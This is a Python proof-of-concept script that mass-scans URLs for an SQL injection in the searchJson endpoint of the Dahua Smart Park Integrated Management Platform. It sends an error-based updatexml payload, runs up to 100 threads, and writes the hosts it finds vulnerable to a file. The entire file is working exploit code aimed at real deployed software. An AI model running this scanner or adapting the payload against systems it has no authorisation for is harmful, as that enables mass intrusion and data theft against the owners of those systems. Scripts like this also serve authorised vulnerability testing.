import argparse,requests,sys,time,re,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m' #输出颜色
RESET = '\033[0m'
def banner():
    text="""       ____.__            ____.__        
    |    |__| ____     |    |__| ____  
    |    |  |/ __ \    |    |  |/ __ \ 
/\__|    |  \  ___//\__|    |  \  ___/ 
\________|__|\___  >________|__|\___  >
                 \/                 \/ 

     
writer:杰杰宝贝
"""
    print(text)
def main():
    banner()
    parser = argparse.ArgumentParser(description='Dahua Smart Park Integrated Management Platform - searchJson SQL injection')
    parser.add_argument('-u','--url',dest='url',type=str,help="your one url")
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file name ')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)

    elif args.file and not args.url:
        urllist = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                urllist.append(url.strip())
        mp = Pool(100)
        mp.map(poc,urllist)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    try:
        payload = "/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20MD5(1)),0x7e),1)--%22%7D/extend/%7B%7D"
        headers = {
            'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:128.0)Gecko/20100101Firefox/128.0',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
            'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Accept-Encoding':'gzip,deflate',
            'Connection':'close',
            'Cookie':'JSESSIONID=88EE9E1E79375B9A1992C211BD42E903',
            'Upgrade-Insecure-Requests':'1',
            'Priority':'u=0,i',
        }
        res = requests.get(url=target+payload,headers=headers,verify=False)
        match  = re.search(r'XPATH syntax error: \'(~[0-9a-fA-F]+)\'',res.text)
        # print(match.group(1))
        if match:
            if '~c4ca4238a0b923820dcc509a6f75849' in match.group(1):
                print(f"{GREEN}[+]{target}---An SQL injection vulnerability exists{RESET}")
                with open ('dh.txt','a',encoding='utf-8') as fp:
                    fp.write(target+'\n')
            else:
                print(f"{GREEN}[+]{target}---There is no SQL injection vulnerability{RESET}")
        else:
            print(f"[-]{target}---There is no SQL injection vulnerability")

    except Exception as e:
        print(f"{target}There is a problem with your website, please test it manually")
        print(f"error message: {str(e)}")
    # print(res.text)
if __name__ == '__main__' :
    main()